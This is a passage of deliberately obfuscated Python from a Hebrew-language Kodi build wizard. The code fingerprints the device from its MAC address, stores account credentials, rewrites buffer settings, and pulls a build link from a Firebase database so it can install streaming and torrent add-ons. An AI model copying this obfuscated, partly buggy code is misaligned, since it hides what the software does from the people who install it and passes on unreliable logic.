    O00O0O000O000OOO0 =str ((getHwAddr ('eth0'))*OO00OO00000OO0O00 )#line:1003
    O0OOOO00OOO0OO0O0 =(O00O0O000O000OOO0 [1 ]+O00O0O000O000OOO0 [2 ]+O00O0O000O000OOO0 [5 ]+O00O0O000O000OOO0 [7 ])#line:1010
    wiz .setS ('action',str (O0OOOO00OOO0OO0O0 ))#line:1013
   except :pass #line:1014
def disply_hwr2 ():#line:1015
   try :#line:1016
    O00OO000O0OO0OOOO =tmdb_list (TMDB_NEW_API )#line:1017
    OO0OO00OOO000000O =str ((getHwAddr ('eth0'))*O00OO000O0OO0OOOO )#line:1019
    O0O00000O0O0OOOOO =(OO0OO00OOO000000O [1 ]+OO0OO00OOO000000O [2 ]+OO0OO00OOO000000O [5 ]+OO0OO00OOO000000O [7 ])#line:1028
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O00000O0O0OOOOO )#line:1032
   except :pass #line:1033
def getHwAddr (OO00O0OOO0O0O0OOO ):#line:1035
   import subprocess ,time #line:1036
   if xbmc .getCondVisibility ('system.platform.android'):#line:1037
     OOO0O00O0OOOOO00O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1038
     O0O00O0OO0O000OO0 =re .compile ('link/ether (.+?) brd').findall (str (OOO0O00O0OOOOO00O ))#line:1039
     OOO0O000OOOOO0OO0 =0 #line:1040
     for O0O00OO00O00000O0 in O0O00O0OO0O000OO0 :#line:1041
      if O0O00O0OO0O000OO0 !='00:00:00:00:00:00':#line:1042
          O0OOOO00O0OOOO0O0 =O0O00OO00O00000O0 #line:1043
          OOO0O000OOOOO0OO0 =OOO0O000OOOOO0OO0 +int (O0OOOO00O0OOOO0O0 .replace (':',''),16 )#line:1044
          break #line:1045
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1046
       O000000OOOOO00O00 =0 #line:1047
       OOO0O000OOOOO0OO0 =0 #line:1048
       OO0O00O0OOOO0OOOO =[]#line:1049
       OO0O00OO000O0OO0O =os .popen ("getmac").read ()#line:1050
       OO0O00OO000O0OO0O =OO0O00OO000O0OO0O .split ("\n")#line:1051
       for OOOOOOOOOOO00000O in OO0O00OO000O0OO0O :#line:1052
            O0OO0OO00O00OOOOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOOOOOOOOO00000O ,re .I )#line:1053
            if O0OO0OO00O00OOOOO :#line:1054
                O0O00O0OO0O000OO0 =O0OO0OO00O00OOOOO .group ().replace ('-',':')#line:1055
                OO0O00O0OOOO0OOOO .append (O0O00O0OO0O000OO0 )#line:1056
                OOO0O000OOOOO0OO0 =OOO0O000OOOOO0OO0 +int (O0O00O0OO0O000OO0 .replace (':',''),16 )#line:1057
                break #line:1058
   elif xbmc .getCondVisibility ('system.platform.linux'):#line:1059
       OOO0O000OOOOO0OO0 =0 #line:1060
       import uuid #line:1061
       O0O00O0OO0O000OO0 =hex (uuid .getnode ())#line:1062
       OOO0O000OOOOO0OO0 =OOO0O000OOOOO0OO0 +int (O0O00O0OO0O000OO0 .replace (':',''),16 )#line:1063
   else :#line:1064
       OOO0O000OOOOO0OO0 =0 #line:1065
       import uuid #line:1066
       O0O00O0OO0O000OO0 =hex (uuid .getnode ())#line:1067
       OOO0O000OOOOO0OO0 =OOO0O000OOOOO0OO0 +int (O0O00O0OO0O000OO0 .replace (':',''),16 )#line:1068
   try :#line:1083
    return OOO0O000OOOOO0OO0 #line:1084
   except :pass #line:1085
def getHwAddr_old (O0O0000O0OO00O0O0 ):#line:1087
   import subprocess ,time #line:1088
   O0OO000O000OOOO00 ='windows'#line:1089
   if xbmc .getCondVisibility ('system.platform.android'):#line:1090
       O0OO000O000OOOO00 ='android'#line:1091
   if xbmc .getCondVisibility ('system.platform.android'):#line:1092
     O0OOO0O0O0OO0000O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1093
     OOOOOO0O0O0O00000 =re .compile ('link/ether (.+?) brd').findall (str (O0OOO0O0O0OO0000O ))#line:1095
     OO0OOO0OOOOOOOOOO =0 #line:1096
     for O00OOO0OO0OOO000O in OOOOOO0O0O0O00000 :#line:1097
      if OOOOOO0O0O0O00000 !='00:00:00:00:00:00':#line:1098
          O0OOO0OOOO0O00OOO =O00OOO0OO0OOO000O #line:1099
          OO0OOO0OOOOOOOOOO =OO0OOO0OOOOOOOOOO +int (O0OOO0OOOO0O00OOO .replace (':',''),16 )#line:1100
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1102
       OOO000OO00000000O =0 #line:1103
       OO0OOO0OOOOOOOOOO =0 #line:1104
       O0OO0OOO00O0OOOO0 =[]#line:1105
       OOO0O0000OO0OOO0O =os .popen ("getmac").read ()#line:1106
       OOO0O0000OO0OOO0O =OOO0O0000OO0OOO0O .split ("\n")#line:1107
       for OOOO0OO0O00OO0OOO in OOO0O0000OO0OOO0O :#line:1109
            O00OOO0OOO00O0O0O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOO0OO0O00OO0OOO ,re .I )#line:1110
            if O00OOO0OOO00O0O0O :#line:1111
                OOOOOO0O0O0O00000 =O00OOO0OOO00O0O0O .group ().replace ('-',':')#line:1112
                O0OO0OOO00O0OOOO0 .append (OOOOOO0O0O0O00000 )#line:1113
                OO0OOO0OOOOOOOOOO =OO0OOO0OOOOOOOOOO +int (OOOOOO0O0O0O00000 .replace (':',''),16 )#line:1116
   else :#line:1118
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1119
   try :#line:1136
    return OO0OOO0OOOOOOOOOO #line:1137
   except :pass #line:1138
def getpass ():#line:1139
	disply_hwr2 ()#line:1141
def setpass ():#line:1142
    OO00O0O0O00O0OOO0 =xbmcgui .Dialog ()#line:1143
    O000000O00O0O0OO0 =''#line:1144
    O0000OOOO0OOO0OO0 =xbmc .Keyboard (O000000O00O0O0OO0 ,'הכנס סיסמה')#line:1146
    O0000OOOO0OOO0OO0 .doModal ()#line:1147
    if O0000OOOO0OOO0OO0 .isConfirmed ():#line:1148
           O0000OOOO0OOO0OO0 =O0000OOOO0OOO0OO0 .getText ()#line:1149
    wiz .setS ('pass',str (O0000OOOO0OOO0OO0 ))#line:1150
def setuname ():#line:1151
    O00OOOOOO0O000O0O =''#line:1152
    OO000O00OO0O0OO0O =xbmc .Keyboard (O00OOOOOO0O000O0O ,'הכנס שם משתמש')#line:1153
    OO000O00OO0O0OO0O .doModal ()#line:1154
    if OO000O00OO0O0OO0O .isConfirmed ():#line:1155
           O00OOOOOO0O000O0O =OO000O00OO0O0OO0O .getText ()#line:1156
           wiz .setS ('user',str (O00OOOOOO0O000O0O ))#line:1157
def powerkodi ():#line:1158
    os ._exit (1 )#line:1159
def xml_data_advSettings_old (O0OO0O00O00O000O0 ):#line:1160
	O0O00OOO00O0OO000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0OO0O00O00O000O0 #line:1170
	return O0O00OOO00O0OO000 #line:1171
def xml_data_advSettings_New (OO0OOO000OOOOOOO0 ):#line:1173
    O0OOO0O0OO000OOO0 ="""<advancedsettings>
      <cache>
        <memorysize>%s</memorysize> 
        <buffermode>2</buffermode>
        <readfactor>2</readfactor>
      </cache>
    <video>
        <subsdelayrange>200</subsdelayrange>
    </video>
</advancedsettings>"""%OO0OOO000OOOOOOO0 #line:1183
    return O0OOO0O0OO000OOO0 #line:1184
def write_ADV_SETTINGS_XML (OOOOOO0OO0OO000O0 ):#line:1185
    if not os .path .exists (xml_file ):#line:1186
        with open (xml_file ,"w")as O0O0OO0OOOO000O00 :#line:1187
            O0O0OO0OOOO000O00 .write (xml_data )#line:1188
def clean_buffer ():#line:1189
    O000OO00O0OOO00OO =xbmcgui .Dialog ()#line:1190
    OO0O0O00O0O0O0OO0 =O000OO00O0OOO00OO .yesno (ADDONTITLE ,"האם למחוק את הגדרת הבאפר שלכם?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:1191
    if OO0O0O00O0O0O0OO0 ==1 :#line:1192
        try :#line:1193
            os .remove (os .path .join (translatepath ("special://userdata/"),"advancedsettings.xml"))#line:1194
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Buffer'),'הגדרת הבאפר נמחקה')#line:1195
        except :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Buffer'),'אין קובץ באפר למחיקה')#line:1196
    else :#line:1197
     sys .exit ()#line:1198
def auto_buffer ():#line:1200
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'מגדיר באפר לפי נתוני מכשיר'),'אנא המתן...')#line:1201
    OOOO0000OOO0OO0O0 =translatepath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1202
    O0O00OOO0OOO000OO =xbmc .getInfoLabel ("System.Memory(total)")#line:1203
    O0OO0OO00O00OO0OO =xbmc .getInfoLabel ("System.FreeMemory")#line:1204
    O00O00000O00000OO =re .sub ('[^0-9]','',O0OO0OO00O00OO0OO )#line:1205
    O00O00000O00000OO =int (O00O00000O00000OO )/3 #line:1206
    OOOO0OOO00OO00OOO =O00O00000O00000OO *1024 *1024 #line:1208
    with open (OOOO0000OOO0OO0O0 ,"w")as OOO0O00O00OOOO00O :#line:1216
            O00OOO00O0OOO00O0 =xml_data_advSettings_New (str (OOOO0OOO00OO00OOO ))#line:1217
            OOO0O00O00OOOO00O .write (O00OOO00O0OOO00O0 )#line:1218
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'זיכרון באפר שהוגדר'),str (int (OOOO0OOO00OO00OOO )))#line:1219
def auto_buffer_fromskin ():#line:1220
    OOOOO00OO000OO0O0 =xbmcgui .Dialog ()#line:1221
    O0O00O0O00000OO0O =OOOOO00OO000OO0O0 .yesno (ADDONTITLE ,"האם להגדיר באפר לפי נתוני המכשיר שלכם?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:1222
    if O0O00O0O00000OO0O ==1 :#line:1223
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'מגדיר באפר לפי נתוני מכשיר'),'אנא המתן...')#line:1224
        O00O00O00000OOO00 =translatepath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1225
        O000000O00O000O00 =xbmc .getInfoLabel ("System.Memory(total)")#line:1226
        OOOO00OO00OO0O000 =xbmc .getInfoLabel ("System.FreeMemory")#line:1227
        O0O0OO00OOOO00O0O =re .sub ('[^0-9]','',OOOO00OO00OO0O000 )#line:1228
        O0O0OO00OOOO00O0O =int (O0O0OO00OOOO00O0O )/3 #line:1229
        OOO00OOO000O0OOO0 =O0O0OO00OOOO00O0O *1024 *1024 #line:1231
        with open (O00O00O00000OOO00 ,"w")as OO0OOO00OO0OOOOO0 :#line:1239
                O0OOO0OO0OOOO00O0 =xml_data_advSettings_New (str (OOO00OOO000O0OOO0 ))#line:1240
                OO0OOO00OO0OOOOO0 .write (O0OOO0OO0OOOO00O0 )#line:1241
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'זיכרון באפר שהוגדר'),str (int (OOO00OOO000O0OOO0 )))#line:1242
        resetkodi ()#line:1243
    else :#line:1244
     sys .exit ()#line:1245
def _OOOOO000O00O0O000 (default ="",heading ="",hidden =False ):#line:1246
    ""#line:1247
    OO00O00OO00O00O0O =xbmc .Keyboard (default ,heading ,hidden )#line:1248
    OO00O00OO00O00O0O .doModal ()#line:1249
    if (OO00O00OO00O00O0O .isConfirmed ()):#line:1250
        return str (OO00O00OO00O00O0O .getText (),"utf-8")#line:1251
    return default #line:1252
def index ():#line:1254
	addFile ('קוד מכשיר: [COLOR yellow]%s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1255
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1256
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1285
	if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1286
		addFile ('עדכון מערכת','force_update',icon =ICONSAVE ,themeit =THEME1 )#line:1287
	addFile ('-----------------','',themeit =THEME3 )#line:1288
	addFile ('אימות חשבון','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1292
	if BUILDNAME =="":#line:1294
		addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1295
	else :#line:1296
		addDir ('התקנה מחדש','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1297
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1299
def firstinstall ():#line:1301
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1302
def morsetup ():#line:1305
	addDir ('התאמה למערכת הפעלה לינוקס','linux',icon =ICONSAVE ,themeit =THEME1 )#line:1306
	addDir ('התאם את טלמדיה לאנדרואיד 5','telemedia5',icon =ICONSAVE ,themeit =THEME1 )#line:1307
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1308
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1309
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1311
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1312
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1316
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1317
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:1321
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:1322
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1323
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1333
	setView ('files','viewType')#line:1334
def morsetup2 ():#line:1335
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1336
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1337
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1338
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1339
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1340
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1341
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1342
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1343
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1344
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1345
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1346
def fastupdate ():#line:1347
    if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1348
        addFile ('עדכון מערכת','testnotify',themeit =THEME1 )#line:1349
def forcefastupdate ():#line:1351
			O00OOO0O0000O00OO ="[COLOR %s]ברוכים הבאים לעדכון המערכת![/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1352
			wiz .ForceFastUpDate (ADDONTITLE ,O00OOO0O0000O00OO )#line:1353
def rdsetup ():#line:1357
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:1358
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:1359
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:1361
def traktsetup ():#line:1365
	addFile ('[COLOR yellow]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1366
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1367
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1368
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1369
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1370
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1371
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1372
	setView ('files','viewType')#line:1373
def setautorealdebrid ():#line:1374
    from resources .libs import real_debrid #line:1375
    OOOOO000O000O0OO0 =real_debrid .RealDebridFirst ()#line:1376
    OOOOO000O000O0OO0 .auth ()#line:1377
def setrealdebrid ():#line:1379
    OO000OO0OOOOO0OOO =(wiz .getS ("auto_rd"))#line:1380
    if OO000OO0OOOOO0OOO =='false':#line:1381
       ADDON .openSettings ()#line:1382
    else :#line:1383
        from resources .libs import real_debrid #line:1384
        O00OO00OOOO00OOOO =real_debrid .RealDebrid ()#line:1385
        O00OO00OOOO00OOOO .auth ()#line:1386
def read_firebase_c (O0O0OO0O0O0000OOO ):#line:1390
    from resources .libs import firebase #line:1391
    O000O00000O00OOOO =firebase .FirebaseApplication ('https://zxcsd-3bae5-default-rtdb.firebaseio.com',None )#line:1392
    OO0O0000OO000O0OO =O000O00000O00OOOO .get ('/',None )#line:1393
    if O0O0OO0O0O0000OOO in OO0O0000OO000O0OO :#line:1394
        return OO0O0000OO000O0OO [O0O0OO0O0O0000OOO ]#line:1395
    else :#line:1396
        return {}#line:1397
def readcode ():#line:1398
    OO0OOOOOO000O00OO =read_firebase_c ('build_link')#line:1399
    O00OO0OOOO0O00O0O =[]#line:1400
    for O0OOOO0O0OO00O000 in OO0OOOOOO000O00OO :#line:1401
        OO0O0O000O000OOOO =OO0OOOOOO000O00OO [O0OOOO0O0OO00O000 ]#line:1402
        O00OO0OOOO0O00O0O .append ((OO0O0O000O000OOOO ['link']))#line:1403
    for O00000O000O0O000O in O00OO0OOOO0O00O0O :#line:1404
       return O00000O000O0O000O #line:1405
def resolveurlsetup ():#line:1406
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1407
def urlresolversetup ():#line:1408
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1409
def placentasetup ():#line:1411
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1412
def reptiliasetup ():#line:1413
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1414
def flixnetsetup ():#line:1415
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1416
def yodasetup ():#line:1417
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1418
def numberssetup ():#line:1419
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1420
def uranussetup ():#line:1421
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1422
def genesissetup ():#line:1423
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1424
def net_tools (view =None ):#line:1426
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1427
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1428
	setView ('files','viewType')#line:1430
def speedMenu ():#line:1431
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1432
def viewIP ():#line:1433
	OOO00OOO000O000O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1447
	O000O00O0O000O0OO =[];O00000O000000O0OO =0 #line:1448
	for OOOO0OO00O0OO0000 in OOO00OOO000O000O0 :#line:1449
		O000OOOO0OOOO00O0 =wiz .getInfo (OOOO0OO00O0OO0000 )#line:1450
		OO0000OO000O0O0O0 =0 #line:1451
		while O000OOOO0OOOO00O0 =="Busy"and OO0000OO000O0O0O0 <10 :#line:1452
			O000OOOO0OOOO00O0 =wiz .getInfo (OOOO0OO00O0OO0000 );OO0000OO000O0O0O0 +=1 ;wiz .log ("%s sleep %s"%(OOOO0OO00O0OO0000 ,str (OO0000OO000O0O0O0 )));xbmc .sleep (1000 )#line:1453
		O000O00O0O000O0OO .append (O000OOOO0OOOO00O0 )#line:1454
		O00000O000000O0OO +=1 #line:1455
	OO000O0000O00O0O0 ,O0OOO0OOOO0O00O00 ,OO00O000O0O0OO0OO =getIP ()#line:1456
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00O0O000O0OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1457
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0000O00O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1458
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0OOOO0O00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1459
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O000O0O0OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1460
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00O0O000O0OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1461
	setView ('files','viewType')#line:1462
def buildMenu ():#line:1463
    if KODIV <=18 :#line:1466
        DIALOG .ok (ADDONTITLE ,'ההתקנה זמינה מקודי 19 ומעלה'+'\n'+' גרסת הקודי שלך היא: '+str (KODIV ))#line:1467
        sys .exit ()#line:1468
    if not len (ADDON .getSetting ("user"))>0 or not len (ADDON .getSetting ("pass"))>0 :#line:1469
        addFile ('התקנה','install'," Kodi Premium",'fresh',description ='',fanart =FANART ,icon =ICONBUILDS ,themeit =THEME1 )#line:1470
    else :#line:1475
        if BUILDNAME =="":#line:1477
            addFile ('התקנה','install'," Kodi Premium",'fresh',description ='',fanart =FANART ,icon =ICONBUILDS ,themeit =THEME1 )#line:1478
        else :#line:1479
            addFile ('התקנה מחדש','install'," Kodi Premium",'fresh',description ='',fanart =FANART ,icon =ICONBUILDS ,themeit =THEME1 )#line:1480
            addFile ('אימות חשבון','passandUsername'," Kodi Premium",'passandUsername',themeit =THEME1 )#line:1481
    addFile ('קוד מכשיר: [COLOR yellow]%s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1483
    addFile (' ',' ',icon =ICONBUILDS ,themeit =THEME1 )#line:1484
    addFile (' ',' ',icon =ICONBUILDS ,themeit =THEME1 )#line:1485
    addFile ('לעזרה בטלגרם לחצו כאן','help_install',icon =ICONBUILDS ,themeit =THEME1 )#line:1486
def buildMenu22 ():#line:1487
	if USERNAME ==''or PASSWORD =='':#line:1489
		ADDON .openSettings ()#line:1490
		if BUILDNAME =="":#line:1491
			xbmc .executebuiltin ("ActivateWindow(home)")#line:1492
		sys .exit ()#line:1493
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מאמת פרטים, אנא המתן...[/COLOR]'%COLOR2 )#line:1496
	check ()#line:1497
	O0OOO0000O00O0000 =u_list (ld (BL ))#line:1498
	O0OOOOOOO0O0O00OO =wiz .workingURL (ld (BL ))#line:1501
	if not O0OOOOOOO0O0O00OO ==True :#line:1502
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1503
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1504
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1505
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1506
		addFile ('%s'%O0OOOOOOO0O0O00OO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1507
	else :#line:1508
		OOO0O00OO000O0O0O ,OO00O0OOOOOO00OO0 ,O0O0OO0OO00OOO0O0 ,O00O00OO00OO000OO ,O0OO00O0OOOO0O00O ,O0O00O00OO00O000O ,O00OOO00OOOOOOO00 =wiz .buildCount ()#line:1509
		OOOOO0OO000OO0000 =False ;O000O0O0OO000O0OO =[]#line:1510
		if THIRDPARTY =='true':#line:1511
			if not THIRD1NAME ==''and not THIRD1URL =='':OOOOO0OO000OO0000 =True ;O000O0O0OO000O0OO .append ('1')#line:1512
			if not THIRD2NAME ==''and not THIRD2URL =='':OOOOO0OO000OO0000 =True ;O000O0O0OO000O0OO .append ('2')#line:1513
			if not THIRD3NAME ==''and not THIRD3URL =='':OOOOO0OO000OO0000 =True ;O000O0O0OO000O0OO .append ('3')#line:1514
		OOOO0OOO0OOO00OO0 =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1515
		O000000OO0OOO00OO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO0OOO0OOO00OO0 )#line:1516
		if OOO0O00OO000O0O0O ==1 and OOOOO0OO000OO0000 ==False :#line:1517
			for O000OO00OO0OO00OO ,O0OO00OOO00OO000O ,O0OO00000OO00000O ,O00O0O00OOO00OOOO ,OOO00000OO0OO000O ,OOOOO0OO00OO0O000 ,OOOOO0O0O000O0O00 ,OOO0OO0OO00O0O00O ,O0000O0OOO0OOOO00 ,O0OO0O0O00O00OO00 in O000000OO0OOO00OO :#line:1518
				if not SHOWADULT =='true'and O0000O0OOO0OOOO00 .lower ()=='yes':continue #line:1519
				if not DEVELOPER =='true'and wiz .strTest (O000OO00OO0OO00OO ):continue #line:1520
				viewBuild (O000000OO0OOO00OO [0 ][0 ])#line:1521
				return #line:1522
		if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1525
			addFile ('עדכון מערכת','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1526
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1527
		if OOOOO0OO000OO0000 ==True :#line:1528
			for OO00OO0OOO0O0O0OO in O000O0O0OO000O0OO :#line:1529
				O000OO00OO0OO00OO =eval ('THIRD%sNAME'%OO00OO0OOO0O0O0OO )#line:1530
		if len (O000000OO0OOO00OO )>=1 :#line:1532
			if SEPERATE =='true':#line:1533
				for O000OO00OO0OO00OO ,O0OO00OOO00OO000O ,O0OO00000OO00000O ,O00O0O00OOO00OOOO ,OOO00000OO0OO000O ,OOOOO0OO00OO0O000 ,OOOOO0O0O000O0O00 ,OOO0OO0OO00O0O00O ,O0000O0OOO0OOOO00 ,O0OO0O0O00O00OO00 in O000000OO0OOO00OO :#line:1534
					if not SHOWADULT =='true'and O0000O0OOO0OOOO00 .lower ()=='yes':continue #line:1535
					if not DEVELOPER =='true'and wiz .strTest (O000OO00OO0OO00OO ):continue #line:1536
					O0O00OOOOO0000000 =createMenu ('install','',O000OO00OO0OO00OO )#line:1537
